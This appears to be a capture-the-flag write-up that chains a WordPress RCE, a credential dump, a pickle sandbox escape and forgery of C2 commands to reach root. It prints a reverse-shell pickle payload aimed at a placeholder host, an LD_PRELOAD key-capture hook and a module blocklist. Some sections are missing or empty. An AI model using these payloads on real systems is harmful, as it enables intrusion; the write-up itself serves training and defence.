🃏 Briefing

Something on Heinz's machine keeps phoning home. A host inside "A hosts of sorts!" is beaconing out on a schedule nobody authorized, and the team that owns it swears everything's fine.

It isn't. Someone's already inside, quietly holding root and running the show through their own tooling. Get a foothold, work out who's really in control, and take it back from them before they notice you looking.

Vegas Times Hint

Sources say the front door isn't as current as it looks. Once you're past it, keep an eye on what's talking to itself on the inside, not everything that accepts your input is as careful about what it does with it. And whatever's already running the show left more evidence behind than it thinks.

2 wp2shell — Pre-Auth RCE

2.1 The Vulnerability Chain

WordPress 6.9 is affected by the wp2shell chain:

  • CVE-2026-63030 — REST API batch route confusion in /wp-json/batch/v1
  • CVE-2026-60137 — SQL injection via the author__not_in parameter in WP_Query

Chained, these allow an unauthenticated attacker to forge a WordPress administrator and execute arbitrary code.

⚠️ Note on tooling: Not every exploit script works. The wp-json/batch/v1 endpoint returned 404 on the pretty-permalink path but the chain remained exploitable via the query-string form. The exp.py PoC handled the post-ID discovery step correctly and produced a shell.

3.3 Identify the Custom Table

WordPress core tables follow a strict naming convention. Anything that breaks the pattern is custom code — and custom code is where credentials live:

SHOW TABLES
mysql -u wpuser -p'wp_WjURfdI' wordpress -e "SHOW TABLES;"
wp_commentmeta wp_comments wp_infra_accounts <-- custom table (breaks naming convention) wp_links wp_options wp_postmeta wp_posts ... wp_users
🧠 Why wp_infra_accounts? Every other table follows the WordPress core pattern (wp_posts, wp_users, wp_comments, etc.). wp_infra_accounts doesn't — it's custom. The name literally says "infrastructure accounts." That's where the developer put credentials they didn't want in the WordPress admin UI.

3.4 Dump the Credentials

5 Pickle Sandbox Escape → vanessa

5.1 The Restricted Unpickler

After accessing vanessa's home we read restricted_unpickler.py — the "safe" loader. It blocks by module name:

The Blocklist
_BLOCKED_ROOTS = {
    "os", "posix", "nt",
    "subprocess", "_posixsubprocess",
    "sys", "builtins", "__builtin__",
    "importlib", "imp", "runpy",
    "pty", "socket", "shutil", "ctypes",
    "platform", "commands", "multiprocessing", "operator",
}

class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        root = module.split(".")[0]
        if root in _BLOCKED_ROOTS:
            raise pickle.UnpicklingError(
                "blueprint references a blocked module: %r" % module
            )
        return super().find_class(module, name)

5.2 Probe Allowed Modules

Systematically probe which stdlib modules pass the blocklist:

5.3 The Bypass: pydoc.pipepager

pydoc.pipepager(text, cmd) internally calls subprocess.Popen(cmd, shell=True). The pickle only references pydoc, so the blocklist doesn't see the dangerous inner call:

RCE Payload

import pickle, base64, pydoc
class RCE:
    def __reduce__(self):
        return (pydoc.pipepager, ("", "bash -c \"bash -i >& /dev/tcp/YOUR_IP/5555 0>&1\""))
print(base64.b64encode(pickle.dumps(RCE())).decode())
'

Two functions handle key derivation:

  • 0x1449 — a deterministic LCG (seed 0x1a2b3c4d, multiplier 0x41c64e6d, increment 0x3039) that fills 32 bytes
  • 0x14a2 — XORs that buffer with the rodata key to produce the derived key

6.4 The LD_PRELOAD Hook — Definitive Key Capture

Rather than guess the message format, hook the HMAC() call at runtime and print the arguments:

hook.c
#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>

typedef unsigned char *(*hmac_fn)(const void *, const void *, int,
                                  const unsigned char *, size_t,
                                  unsigned char *, unsigned int *);

unsigned char *HMAC(const void *evp_md, const void *key, int key_len,
                    const unsigned char *d, size_t n,
                    unsigned char *md, unsigned int *md_len) {
    static hmac_fn real = NULL;
    if (!real) real = (hmac_fn)dlsym(RTLD_NEXT, "HMAC");
    fprintf(stderr, "[HOOK] key(%d)=", key_len);
    for (int i = 0; i < key_len; i++) fprintf(stderr, "%02x", ((unsigned char*)key)[i]);
    fprintf(stderr, "\n[HOOK] msg(%zu)=", n);
    fwrite(d, 1, n, stderr);
    fprintf(stderr, "\n");
    return real(evp_md, key, key_len, d, n, md, md_len);
}

📚 Lessons Learned

Stage Technique Vulnerability Impact
1. Initial Access wp2shell Outdated WordPress 6.9 core Unauthenticated RCE
2. Credential Harvest DB dump Custom table with plaintext creds SSH as norm
3. Operator Escalation Pickle sandbox escape Blocklist-based RestrictedUnpickler RCE as vanessa
4. Root HMAC key recovery + task forgery Hardcoded signing key, unauthenticated SUBMIT Arbitrary root commands via implant

🛡️ For Defenders

  • Patch promptly. WordPress 6.9 was vulnerable to wp2shell. Pre-auth RCE chains in popular CMSs are exploited within hours of disclosure.
  • Don't store credentials in custom application tables. If a service account's password must be persisted, use a secrets vault (HashiCorp Vault, AWS Secrets Manager) with proper access controls.
  • Never unpickle untrusted input. Python's pickle is not a safe serialization format. Use JSON, MessagePack, or CBOR with strict schemas.
  • Allowlists, not blocklists. The RestrictedUnpickler blocked modules by name — trivially bypassed via pydoc.pipepager. A strict (module, name) allowlist is the only safe approach.
  • Never hardcode signing keys in binaries. The implant's HMAC key was in .rodata — recoverable with objdump. Keys must be loaded from protected storage and rotated periodically.
  • Authenticate the submission channel. The C2 accepted SUBMIT from any local user with socket access. Commands should be signed with per-operator keys, not a global secret.

⚔️ For Attackers

  • Outdated framework versions are the front door. Always fingerprint and compare against known-vulnerable ranges.
  • Custom database tables break naming conventions. When enumerating a DB, scan for tables that don't fit the framework's pattern — they contain application-specific data, and often credentials.
  • Read the config files first. wp-config.php, panel.conf, .env — 90% of privilege escalations start here.
  • Probe restricted deserializers with allowed modules. When a blocklist is present, test every stdlib module for "code-execution primitives": pydoc, timeit, cProfile, code, trace.
  • Runtime hooks beat static analysis. LD_PRELOAD on a copied binary revealed both the HMAC key and the exact message format — no guessing, no brute force.
  • Recovered keys unlock the whole C2. Once you can sign messages, you control the implant — including root-level execution.
🧠 The Core Lesson: Agent P is a masterclass in chained privilege escalation. Each stage reveals exactly what's needed for the next: WordPress RCE → DB creds → operator secret → pickle bypass → binary RE → C2 forgery. No single bug is catastrophic alone; the power comes from linking them. In real engagements, this is how you go from an unauthenticated web request to full root — patience, enumeration, and one clue at a time.
